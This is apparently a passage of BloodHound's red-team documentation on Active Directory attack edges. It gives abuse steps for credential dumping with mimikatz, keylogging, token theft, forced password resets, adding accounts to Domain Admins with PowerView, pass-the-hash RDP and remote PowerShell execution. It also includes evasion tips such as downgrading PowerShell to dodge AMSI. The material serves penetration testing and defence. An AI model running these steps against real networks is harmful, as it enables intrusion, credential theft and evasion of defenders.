<section id="abuse-info">
<h3>Abuse Info<a class="headerlink" href="#abuse-info" title="Link to this heading"></a></h3>
<p>There are several ways to pivot to a Windows system. If using Cobalt
Strike’s beacon, check the help info for the commands “psexec”, “psexec_psh”,
“wmi”, and “winrm”. With Empire, consider the modules for Invoke-PsExec,
Invoke-DCOM, and Invoke-SMBExec.</p>
<p>With Metasploit, consider the modules “exploit/windows/smb/psexec”,
“exploit/windows/winrm/winrm_script_exec”, and
“exploit/windows/local/ps_wmi_exec”.</p>
<p>Additionally, there are several manual methods for remotely executing code on
the machine, including via RDP, with the service control binary and
interaction with the remote machine’s service control manager, and remotely
instantiating DCOM objects. For more information about these lateral movement
techniques, see the References section below.</p>
<p><strong>Gathering credentials</strong></p>
<p>The most well-known tool for gathering credentials from a Windows system is
mimikatz. mimikatz is built into several agents and toolsets, including
Cobalt Strike’s beacon, Empire, and Meterpreter. While running in a high
integrity process with SeDebugPrivilege, execute one or more of mimikatz’s
credential gathering techniques (e.g.: sekurlsa::wdigest,
sekurlsa::logonpasswords, etc.), then parse or investigate the output to
find clear-text credentials for other users logged onto the system.</p>
<p>You may also gather credentials when a user types them or copies them to
their clipboard! Several keylogging capabilities exist, several agents and
toolsets have them built-in. For instance, you may use meterpreter’s
“keyscan_start” command to start keylogging a user, then “keyscan_dump” to
return the captured keystrokes. Or, you may use PowerSploit’s
Invoke-ClipboardMonitor to periodically gather the contents of the user’s
clipboard.</p>
<p><strong>Token Impersonation</strong></p>
<p>You may run into a situation where a user is logged onto the system, but
you can’t gather that user’s credential. This may be caused by a host-based
security product, lsass protection, etc. In those circumstances, you may
abuse Windows’ token model in several ways. First, you may inject your agent
into that user’s process, which will give you a process token as that user,
which you can then use to authenticate to other systems on the network. Or,
you may steal a process token from a remote process and start a thread in
your agent’s process with that user’s token. For more information about
token abuses, see the References tab.</p>
<p><strong>Disabling host-based security controls</strong></p>
<p>Several host-based controls may affect your ability to execute certain
techniques, such as credential theft, process injection, command line
execution, and writing files to disk. Administrators can often disable these
host-based controls in various ways, such as stopping or otherwise disabling
a service, unloading a driver, or making registry key changes. For more
information, see the References section below.</p>
</section>
<section id="opsec-considerations">
<h3>Opsec Considerations<a class="headerlink" href="#opsec-considerations" title="Link to this heading"></a></h3>
<p>There are several forensic artifacts generated by the techniques described
above. For instance, lateral movement via PsExec will generate 4697 events on
the target system. If the target organization is collecting and analyzing those
events, they may very easily detect lateral movement via PsExec.</p>
<p>Additionally, an EDR product may detect your attempt to inject into lsass and
alert a SOC analyst. There are many more opsec considerations to keep in mind
when abusing administrator privileges. For more information, see the References
section below.</p>
</section>
<section id="references">
<h3>References<a class="headerlink" href="#references" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://attack.mitre.org/wiki/Lateral_Movement">https://attack.mitre.org/wiki/Lateral_Movement</a></p>
<p><strong>Gathering Credentials</strong></p>
<ul class="simple">
<li><p><a class="reference external" href="http://blog.gentilkiwi.com/mimikatz">http://blog.gentilkiwi.com/mimikatz</a></p></li>
<li><p><a class="reference external" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p></li>
<li><p><a class="reference external" href="https://adsecurity.org/?page_id=1821">https://adsecurity.org/?page_id=1821</a></p></li>
<li><p><a class="reference external" href="https://attack.mitre.org/wiki/Credential_Access">https://attack.mitre.org/wiki/Credential_Access</a></p></li>
</ul>
<p><strong>Token Impersonation</strong></p>
<ul class="simple">
<li><p><a class="reference external" href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf">https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf</a></p></li>
<li><p><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a></p></li>
<li><p><a class="reference external" href="https://attack.mitre.org/wiki/Technique/T1134">https://attack.mitre.org/wiki/Technique/T1134</a></p></li>
</ul>
<p><strong>Disabling host-based security controls</strong></p>
<ul class="simple">
<li><p><a class="reference external" href="https://blog.netspi.com/10-evil-user-tricks-for-bypassing-anti-virus/">https://blog.netspi.com/10-evil-user-tricks-for-bypassing-anti-virus/</a></p></li>
<li><p><a class="reference external" href="https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/">https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/</a></p></li>
</ul>
<p><strong>Opsec Considerations</strong></p>
<ul class="simple">
<li><p><a class="reference external" href="https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/">https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="memberof">
<h2>MemberOf<a class="headerlink" href="#memberof" title="Link to this heading"></a></h2>
<p>Groups in active directory grant their members any privileges the group itself
has. If a group has rights to another principal, users/computers in the group,
as well as other groups inside the group inherit those permissions.</p>
<section id="id1">
<h3>Abuse Info<a class="headerlink" href="#id1" title="Link to this heading"></a></h3>
<p>No abuse is necessary. This edge simply indicates that a principal belongs to a
security group.</p>
</section>
<section id="id2">
<h3>Opsec Considerations<a class="headerlink" href="#id2" title="Link to this heading"></a></h3>
<p>No opsec considerations apply to this edge.</p>
</section>
<section id="id3">
<h3>References<a class="headerlink" href="#id3" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://adsecurity.org/?tag=ad-delegation">https://adsecurity.org/?tag=ad-delegation</a></p></li>
<li><p><a class="reference external" href="https://www.itprotoday.com/management-mobility/view-or-remove-active-directory-delegated-permissions">https://www.itprotoday.com/management-mobility/view-or-remove-active-directory-delegated-permissions</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="hassession">
<h2>HasSession<a class="headerlink" href="#hassession" title="Link to this heading"></a></h2>
<p>When a user authenticates to a computer, they often leave credentials exposed on
the system, which can be retrieved through LSASS injection, token manipulation
or theft, or injecting into a user’s process.</p>
<p>Any user that is an administrator to the system has the capability to retrieve
the credential material from memory if it still exists.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>A session does not guarantee credential material is present, only possible.</p>
</div>
<p>This video explains exactly how BloodHound’s session data collection method works:</p>
<div style="text-align: center; margin-bottom: 2em;">
<iframe width="100%" height="350" src="https://www.youtube.com/embed/q86VgM2Tafc?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div><section id="id4">
<h3>Abuse Info<a class="headerlink" href="#id4" title="Link to this heading"></a></h3>
<p>When a user has a session on the computer, you may be able to obtain credentials for
the user via credential dumping or token impersonation. You must be able to move
laterally to the computer, have administrative access on the computer, and the user
must have a non-network logon session on the computer.</p>
<p>Once you have established a Cobalt Strike Beacon, Empire agent, or other implant on
the target, you can use mimikatz to dump credentials of the user that has a session
on the computer. While running in a high integrity process with SeDebugPrivilege,
execute one or more of mimikatz’s credential gathering techniques (e.g.:
sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the
output to find clear-text credentials for other users logged onto the system.</p>
<p>You may also gather credentials when a user types them or copies them to their
clipboard! Several keylogging capabilities exist, several agents and toolsets have
them built-in. For instance, you may use meterpreter’s “keyscan_start” command to
start keylogging a user, then “keyscan_dump” to return the captured keystrokes. Or,
you may use PowerSploit’s Invoke-ClipboardMonitor to periodically gather the contents
of the user’s clipboard.</p>
<p><strong>Token Impersonation</strong></p>
<p>You may run into a situation where a user is logged onto the system, but you can’t
gather that user’s credential. This may be caused by a host-based security product,
lsass protection, etc. In those circumstances, you may abuse Windows’ token model in
several ways. First, you may inject your agent into that user’s process, which will
give you a process token as that user, which you can then use to authenticate to other
systems on the network. Or, you may steal a process token from a remote process and
start a thread in your agent’s process with that user’s token. For more information
about token abuses, see the References section below.</p>
<p>User sessions can be short lived and only represent the sessions that were present at
the time of collection. A user may have ended their session by the time you move to
the computer to target them. However, users tend to use the same machines, such as the
workstations or servers they are assigned to use for their job duties, so it can be
valuable to check multiple times if a user session has started.</p>
</section>
<section id="id5">
<h3>Opsec Considerations<a class="headerlink" href="#id5" title="Link to this heading"></a></h3>
<p>An EDR product may detect your attempt to inject into lsass and alert a SOC analyst.
There are many more opsec considerations to keep in mind when stealing credentials or
tokens. For more information, see the References section.</p>
</section>
<section id="id6">
<h3>References<a class="headerlink" href="#id6" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="http://blog.gentilkiwi.com/mimikatz">http://blog.gentilkiwi.com/mimikatz</a></p></li>
<li><p><a class="reference external" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p></li>
<li><p><a class="reference external" href="https://adsecurity.org/?page_id=1821">https://adsecurity.org/?page_id=1821</a></p></li>
<li><p><a class="reference external" href="https://attack.mitre.org/wiki/Credential_Access">https://attack.mitre.org/wiki/Credential_Access</a></p></li>
</ul>
<p><strong>Token Impersonation</strong></p>
<ul class="simple">
<li><p><a class="reference external" href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf">https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf</a></p></li>
<li><p><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a></p></li>
<li><p><a class="reference external" href="https://attack.mitre.org/wiki/Technique/T1134">https://attack.mitre.org/wiki/Technique/T1134</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="hassidhistory">
<h2>HasSIDHistory<a class="headerlink" href="#hassidhistory" title="Link to this heading"></a></h2>
<p>The given source principal has, in its SIDHistory
attribute, the SID for the target principal.</p>
<p>When a kerberos ticket is created for source principal, it will
include the SID for the target principal, and therefore grant
the source principal the same privileges and permissions as
the target principal.</p>
<section id="id7">
<h3>Abuse Info<a class="headerlink" href="#id7" title="Link to this heading"></a></h3>
<p>No special actions are needed to abuse this, as the kerberos
tickets created will have all SIDs in the object’s SID history
attribute added to them; however, if traversing a domain trust
boundary, ensure that SID filtering is not enforced, as SID
filtering will ignore any SIDs in the SID history portion of a
kerberos ticket.</p>
<p>By default, SID filtering is not enabled for all domain trust
types.</p>
</section>
<section id="id8">
<h3>Opsec Considerations<a class="headerlink" href="#id8" title="Link to this heading"></a></h3>
<p>No opsec considerations apply to this edge.</p>
</section>
<section id="id9">
<h3>References<a class="headerlink" href="#id9" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://blog.harmj0y.net/redteaming/the-trustpocalypse/">https://blog.harmj0y.net/redteaming/the-trustpocalypse/</a></p></li>
<li><p><a class="reference external" href="https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/">https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/</a></p></li>
<li><p><a class="reference external" href="https://adsecurity.org/?p=1772">https://adsecurity.org/?p=1772</a></p></li>
<li><p><a class="reference external" href="https://adsecurity.org/?tag=sidhistory">https://adsecurity.org/?tag=sidhistory</a></p></li>
<li><p><a class="reference external" href="https://attack.mitre.org/techniques/T1178/">https://attack.mitre.org/techniques/T1178/</a></p></li>
<li><p><a class="reference external" href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/">https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="forcechangepassword">
<h2>ForceChangePassword<a class="headerlink" href="#forcechangepassword" title="Link to this heading"></a></h2>
<p>This edge indicates that the principal can reset the password of the target user without
knowing the current password of that user.</p>
<p>To see an example of this edge being abused, see this clip from Derbycon 2017:</p>
<div style="text-align: center; margin-bottom: 2em;">
<iframe width="100%" height="350" src="https://www.youtube.com/embed/z8thoG7gPd0?t=2291?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div><section id="id10">
<h3>Abuse Info<a class="headerlink" href="#id10" title="Link to this heading"></a></h3>
<p>There are at least two ways to execute this attack. The first and most obvious is by
using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain).
See the opsec considerations section for why this may be a bad idea. The second, and
highly recommended method, is by using the Set-DomainUserPassword function in PowerView.
This function is superior to using the net.exe binary in several ways. For instance, you
can supply alternate credentials, instead of needing to run a process as or logon as the
user with the ForceChangePassword privilege. Additionally, you have much safer execution
options than you do with spawning net.exe (see the opsec info below).</p>
<p>To abuse this privilege with PowerView’s Set-DomainUserPassword, first import PowerView
into your agent session or into a PowerShell instance at the console. You may need to
authenticate to the Domain Controller as the user with the password reset privilege if
you are not running a process as that user.</p>
<p>To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object
(these examples comes from the PowerView help documentation):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$SecPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential(&#39;CONTOSO\\dfm.a&#39;, $SecPassword)
</pre></div>
</div>
<p>Then create a secure string object for the password you want to set on the target user:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$UserPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force
</pre></div>
</div>
<p>Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already
running within a process as the user with the password reset privilege</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred
</pre></div>
</div>
<p>Now that you know the target user’s plain text password, you can either start a new agent
as that user, or use that user’s credentials in conjunction with PowerView’s ACL abuse
functions, or perhaps even RDP to a system the target user has access to. For more ideas
and information, see the references section below.</p>
</section>
<section id="id11">
<h3>Opsec Considerations<a class="headerlink" href="#id11" title="Link to this heading"></a></h3>
<p>Executing this abuse with the net binary will necessarily require command line execution.
If your target organization has command line logging enabled, this is a detection
opportunity for their analysts.</p>
<p>Regardless of what execution procedure you use, this action will generate a 4724 event on
the domain controller that handled the request. This event may be centrally collected and
analyzed by security analysts, especially for users that are obviously very high
privilege groups (i.e.: Domain Admin users). Also be mindful that PowerShell v5 introduced
several key security features such as script block logging and AMSI that provide security
analysts another detection opportunity. You may be able to completely evade those features
by downgrading to PowerShell v2.</p>
<p>Finally, by changing a service account password, you may cause that service to stop
functioning properly. This can be bad not only from an opsec perspective, but also a client
management perspective. Be careful!</p>
</section>
<section id="id12">
<h3>References<a class="headerlink" href="#id12" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p></li>
<li><p><a class="reference external" href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a></p></li>
<li><p><a class="reference external" href="https://www.sixdub.net/?p=579">https://www.sixdub.net/?p=579</a></p></li>
<li><p><a class="reference external" href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4724">https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4724</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="addmembers">
<h2>AddMembers<a class="headerlink" href="#addmembers" title="Link to this heading"></a></h2>
<p>This edge indicates the principal has the ability to add arbitrary principlas to the target
security group. Because of security group delegation, the members of a security group have
the same privileges as that group.</p>
<p>By adding yourself to a group and refreshing your token, you gain all the same privileges
that group has.</p>
<p>See this clip for an example of this edge being abused:</p>
<div style="text-align: center; margin-bottom: 2em;">
<iframe width="100%" height="350" src="https://www.youtube.com/embed/z8thoG7gPd0?t=2123?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div><section id="id13">
<h3>Abuse Info<a class="headerlink" href="#id13" title="Link to this heading"></a></h3>
<p>There are at least two ways to execute this attack. The first and most obvious is by using
the built-in net.exe binary in Windows (e.g.: net group “Domain Admins” dfm.a /add
/domain). See the opsec considerations tab for why this may be a bad idea. The second, and
highly recommended method, is by using the Add-DomainGroupMember function in PowerView.
This function is superior to using the net.exe binary in several ways. For instance, you
can supply alternate credentials, instead of needing to run a process as or logon as the
user with the AddMember privilege. Additionally, you have much safer execution options than
you do with spawning net.exe (see the opsec tab).</p>
<p>To abuse this privilege with PowerView’s Add-DomainGroupMember, first import PowerView into
your agent session or into a PowerShell instance at the console.</p>
<p>You may need to authenticate to the Domain Controller as the user with the AddMembers right
if you are not running a process as that user. To do this in conjunction with
Add-DomainGroupMember, first create a PSCredential object (these examples comes from the
PowerView help documentation):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$SecPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential(&#39;TESTLAB\\dfm.a&#39;, $SecPassword)
</pre></div>
</div>
<p>Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running
within a process owned by the user with the AddMembers privilege</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Add-DomainGroupMember -Identity &#39;Domain Admins&#39; -Members &#39;harmj0y&#39; -Credential $Cred
</pre></div>
</div>
<p>Finally, verify that the user was successfully added to the group with PowerView’s Get-DomainGroupMember:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">DomainGroupMember</span> <span class="o">-</span><span class="n">Identity</span> <span class="s1">&#39;Domain Admins&#39;</span>
</pre></div>
</div>
</section>
<section id="id14">
<h3>Opsec Considerations<a class="headerlink" href="#id14" title="Link to this heading"></a></h3>
<p>Executing this abuse with the net binary will require command line execution. If your target
organization has command line logging enabled, this is a detection opportunity for their
analysts.</p>
<p>Regardless of what execution procedure you use, this action will generate a 4728 event on the
domain controller that handled the request. This event may be centrally collected and analyzed
by security analysts, especially for groups that are obviously very high privilege groups
(i.e.: Domain Admins). Also be mindful that Powershell 5 introduced several key security
features such as script block logging and AMSI that provide security analysts another detection
opportunity.</p>
<p>You may be able to completely evade those features by downgrading to PowerShell v2.</p>
</section>
<section id="id15">
<h3>References<a class="headerlink" href="#id15" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p></li>
<li><p><a class="reference external" href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a></p></li>
<li><p><a class="reference external" href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728">https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="addself">
<h2>AddSelf<a class="headerlink" href="#addself" title="Link to this heading"></a></h2>
<p>This edge indicates the principal has the ability to add itself to the target
security group. Because of security group delegation, the members of a security group have
the same privileges as that group.</p>
<p>By adding yourself to a group and refreshing your token, you gain all the same privileges
that group has.</p>
<p>See this clip for an example of this edge being abused:</p>
<div style="text-align: center; margin-bottom: 2em;">
<iframe width="100%" height="350" src="https://www.youtube.com/embed/z8thoG7gPd0?t=2123?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div><section id="id16">
<h3>Abuse Info<a class="headerlink" href="#id16" title="Link to this heading"></a></h3>
<p>There are at least two ways to execute this attack. The first and most obvious is by using
the built-in net.exe binary in Windows (e.g.: net group “Domain Admins” dfm.a /add
/domain). See the opsec considerations tab for why this may be a bad idea. The second, and
highly recommended method, is by using the Add-DomainGroupMember function in PowerView.
This function is superior to using the net.exe binary in several ways. For instance, you
can supply alternate credentials, instead of needing to run a process as or logon as the
user with the AddSelf privilege. Additionally, you have much safer execution options than
you do with spawning net.exe (see the opsec tab).</p>
<p>To abuse this privilege with PowerView’s Add-DomainGroupMember, first import PowerView into
your agent session or into a PowerShell instance at the console.</p>
<p>You may need to authenticate to the Domain Controller as the user with the AddSelf right
if you are not running a process as that user. To do this in conjunction with
Add-DomainGroupMember, first create a PSCredential object (these examples comes from the
PowerView help documentation):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$SecPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential(&#39;TESTLAB\\dfm.a&#39;, $SecPassword)
</pre></div>
</div>
<p>Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running
within a process owned by the user with the AddSelf privilege</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Add-DomainGroupMember -Identity &#39;Domain Admins&#39; -Members &#39;harmj0y&#39; -Credential $Cred
</pre></div>
</div>
<p>Finally, verify that the user was successfully added to the group with PowerView’s Get-DomainGroupMember:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">DomainGroupMember</span> <span class="o">-</span><span class="n">Identity</span> <span class="s1">&#39;Domain Admins&#39;</span>
</pre></div>
</div>
</section>
<section id="id17">
<h3>Opsec Considerations<a class="headerlink" href="#id17" title="Link to this heading"></a></h3>
<p>Executing this abuse with the net binary will require command line execution. If your target
organization has command line logging enabled, this is a detection opportunity for their
analysts.</p>
<p>Regardless of what execution procedure you use, this action will generate a 4728 event on the
domain controller that handled the request. This event may be centrally collected and analyzed
by security analysts, especially for groups that are obviously very high privilege groups
(i.e.: Domain Admins). Also be mindful that Powershell 5 introduced several key security
features such as script block logging and AMSI that provide security analysts another detection
opportunity.</p>
<p>You may be able to completely evade those features by downgrading to PowerShell v2.</p>
</section>
<section id="id18">
<h3>References<a class="headerlink" href="#id18" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p></li>
<li><p><a class="reference external" href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a></p></li>
<li><p><a class="reference external" href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728">https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="canrdp">
<h2>CanRDP<a class="headerlink" href="#canrdp" title="Link to this heading"></a></h2>
<p>Remote Desktop access allows you to enter an interactive session with the target computer. If
authenticating as a low privilege user, a privilege escalation may allow you to gain high
privileges on the system.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This edge does not guarantee privileged execution.</p>
</div>
<section id="id19">
<h3>Abuse Info<a class="headerlink" href="#id19" title="Link to this heading"></a></h3>
<p>Abuse of this privilege will depend heavily on the type of access you have.</p>
<p><strong>PlainText Credentials with Interactive Access</strong></p>
<p>With plaintext credentials, the easiest way to exploit this privilege is using the built-in
Windows Remote Desktop Client (mstsc.exe). Open mstsc.exe and input the target computer name.
When prompted for credentials, input the credentials for the user with RDP rights to initiate
the remote desktop connection.</p>
<p><strong>Password Hash with Interactive Access</strong></p>
<p>With a password hash, exploitation of this privilege will require local administrator privileges
on a system, and the remote server must allow Restricted Admin Mode.</p>
<p>First, inject the NTLM credential for the user you’re abusing into memory using mimikatz:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">lsadump</span><span class="p">::</span><span class="n">pth</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">dfm</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="n">testlab</span><span class="o">.</span><span class="n">local</span> <span class="o">/</span><span class="n">ntlm</span><span class="p">:</span><span class="o">&lt;</span><span class="n">ntlm</span> <span class="nb">hash</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">run</span><span class="p">:</span><span class="s2">&quot;mstsc.exe /restrictedadmin&quot;</span>
</pre></div>
</div>
<p>This will open a new RDP window. Input the target computer name to initiate the remote desktop
connection. If the target server does not support Restricted Admin Mode, the session will fail.</p>
<p><strong>Plaintext Credentials without Interactive Access</strong></p>
<p>This method will require some method of proxying traffic into the network, such as the socks command
in Cobalt Strike, or direct internet connection to the target network, as well as the xfreerdp
(suggested because of support of Network Level Authentication (NLA)) tool, which can be installed
from the freerdp-x11 package. If using socks, ensure that proxychains is configured properly. Initiate
the remote desktop connection with the following command:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">proxychains</span> <span class="n">xfreerdp</span> <span class="o">/</span><span class="n">u</span><span class="p">:</span><span class="n">dfm</span> <span class="o">/</span><span class="n">d</span><span class="p">:</span><span class="n">testlab</span><span class="o">.</span><span class="n">local</span> <span class="o">/</span><span class="n">v</span><span class="p">:</span><span class="o">&lt;</span><span class="n">computer</span> <span class="n">ip</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>xfreerdp will prompt you for a password, and then initiate the remote desktop connection.</p>
<p><strong>Password Hash without Interactive Access</strong></p>
<p>This method will require some method of proxying traffic into the network, such as the socks command
in cobaltstrike, or direct internet connection to the target network, as well as the xfreerdp
(suggested because of support of Network Level Authentication (NLA)) tool, which can be installed
from the freerdp-x11 package. Additionally, the target computer must allow Restricted Admin Mode. If
using socks, ensure that proxychains is configured properly. Initiate the remote desktop connection
with the following command:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">proxychains</span> <span class="n">xfreerdp</span> <span class="o">/</span><span class="n">pth</span><span class="p">:</span><span class="o">&lt;</span><span class="n">ntlm</span> <span class="nb">hash</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">u</span><span class="p">:</span><span class="n">dfm</span> <span class="o">/</span><span class="n">d</span><span class="p">:</span><span class="n">testlab</span><span class="o">.</span><span class="n">local</span> <span class="o">/</span><span class="n">v</span><span class="p">:</span><span class="o">&lt;</span><span class="n">computer</span> <span class="n">ip</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>This will initiate the remote desktop connection, and will fail if Restricted Admin Mode is not
enabled.</p>
</section>
<section id="id20">
<h3>Opsec Considerations<a class="headerlink" href="#id20" title="Link to this heading"></a></h3>
<p>If the target computer is a workstation and a user is currently logged on, one of two things will
happen. If the user you are abusing is the same user as the one logged on, you will effectively take
over their session and kick the logged on user off, resulting in a message to the user. If the users
are different, you will be prompted to kick the currently logged on user off the system and log on.
If the target computer is a server, you will be able to initiate the connection without issue
provided the user you are abusing is not currently logged in.</p>
<p>Remote desktop will create Logon and Logoff events with the access type RemoteInteractive.</p>
</section>
<section id="id21">
<h3>References<a class="headerlink" href="#id21" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://michael-eder.net/post/2018/native_rdp_pass_the_hash/">https://michael-eder.net/post/2018/native_rdp_pass_the_hash/</a></p></li>
<li><p><a class="reference external" href="https://www.kali.org/penetration-testing/passing-hash-remote-desktop/">https://www.kali.org/penetration-testing/passing-hash-remote-desktop/</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="canpsremote">
<h2>CanPSRemote<a class="headerlink" href="#canpsremote" title="Link to this heading"></a></h2>
<p>PS Session access allows you to enter an interactive session with the target computer. If
authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges
on the system.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This edge does not guarantee privileged execution.</p>
</div>
<section id="id22">
<h3>Abuse Info<a class="headerlink" href="#id22" title="Link to this heading"></a></h3>
<p>Abuse of this privilege will require you to have interactive access with a system on the network.</p>
<p>A remote session can be opened using the New-PSSession powershell command.</p>
<p>You may need to authenticate to the Domain Controller as the user with the PSRemote rights on the
target computer if you are not running as that user. To do this in conjunction with New-PSSession,
first create a PSCredential object (these examples comes from the PowerView help documentation):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$SecPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential(&#39;TESTLAB\\dfm.a&#39;, $SecPassword)
</pre></div>
</div>
<p>Then use the New-PSSession command with the credential we just created:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$session = New-PSSession -ComputerName &lt;target computer name&gt; -Credential $Cred
</pre></div>
</div>
<p>This will open a PowerShell session on the target computer</p>
<p>You can then run a command on the system using the Invoke-Command cmdlet and the session you just
created</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}
</pre></div>
</div>
